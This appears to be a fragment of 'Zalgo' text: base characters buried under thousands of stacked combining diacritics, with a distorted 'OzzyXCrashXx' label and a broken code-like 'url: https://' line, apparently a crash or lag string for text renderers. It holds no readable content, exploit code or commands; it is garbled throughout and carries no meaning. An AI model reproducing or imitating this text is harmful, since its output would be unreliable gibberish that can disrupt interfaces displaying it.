̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖͜͜͜ͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ-O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
      url: `https://̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̛̛̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̚̚̕̕͝͝͝͝